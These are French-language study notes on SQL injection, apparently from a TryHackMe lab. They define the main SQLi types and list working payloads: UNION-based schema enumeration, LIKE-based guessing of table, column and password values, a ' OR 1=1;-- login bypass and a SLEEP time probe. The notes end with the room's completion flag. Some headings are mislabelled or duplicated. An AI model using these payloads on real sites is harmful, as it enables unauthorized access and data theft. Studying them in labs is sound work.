# Injections SQL

## Qu'est-ce que les injections SQL ?
Le point où une application web utilisant le langage SQL peut se transformer en injection SQL est lorsque des données fournies par l'utilisateur sont incluses dans la requête SQL.

## Qu'est-ce que le "In-Band SQLi" ?
L'injection SQL en bande est le type le plus facile à détecter et à exploiter ; en bande se réfère simplement à la même méthode de communication utilisée pour exploiter la vulnérabilité et recevoir les résultats, par exemple, découvrir une vulnérabilité d'injection SQL sur la page d'un site web et pouvoir ensuite extraire des données de la base de données sur la même page.

## Qu'est-ce que le "Blind SQLi - Authentication Bypass" ?
L'une des techniques d'injection SQL aveugle les plus simples consiste à contourner les méthodes d'authentification telles que les formulaires de connexion. Dans ce cas, nous ne sommes pas intéressés par l'extraction de données de la base de données ; nous voulons simplement passer le formulaire de connexion.

## Qu'est-ce que le "Blind SQLi - Boolean Based" ?
L'injection SQL booléenne fait référence à la réponse que nous recevons à la suite de nos tentatives d'injection. Il peut s'agir d'une réponse de type vrai/faux, oui/non, on/off, 1/0 ou de toute autre réponse qui ne peut avoir que deux résultats. Ce résultat confirme que notre charge utile d'injection SQL a réussi ou non. À première vue, on peut penser que cette réponse limitée ne fournit pas beaucoup d'informations. 

## Qu'est-ce que le "Blind SQLi - Time Based" ?
Une injection SQL aveugle basée sur le temps est très similaire à l'injection booléenne ci-dessus dans la mesure où les mêmes requêtes sont envoyées, mais il n'y a pas d'indicateur visuel de l'exactitude ou de l'inexactitude de vos requêtes cette fois-ci. Au lieu de cela, l'indicateur d'une requête correcte est basé sur le temps que prend la requête pour se terminer. Ce délai est introduit à l'aide de méthodes intégrées telles que SLEEP(x) et l'instruction UNION. 

## Qu'est-ce que le "Out-of-Band SQLi" ?
L'injection SQL hors bande n'est pas aussi courante, car elle dépend soit de fonctions spécifiques activées sur le serveur de base de données, soit de la logique commerciale de l'application web, qui effectue une sorte d'appel réseau externe sur la base des résultats d'une requête SQL.
## Commandes

### Récupérer le nom de la base de données

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
database()
```

### Récupérer la liste des tables d'une base de données

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

### Récupérer la liste des colonnes d'une table

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

### Récupérer les valeurs des enregistrements d'une table

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

### By pass un formulaire de connexion

```
Pour en faire une requête qui renvoie toujours la valeur "true", nous pouvons saisir ce qui suit dans le champ du mot de passe :
' OR 1=1;--
```

### Trouver une table dans une base de données connue par essaie et erreur

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

### Trouver les colonnes d'une table connue par essaie et erreur

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

### Trouver un champ par essaie et erreur

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

### Ajouter un sleep dans une requête.

```
admin123' UNION SELECT SLEEP(5),2;--
```

### Preuve que vous avez terminé le tutoriel : THM{SQL_INJECTION_MASTER}
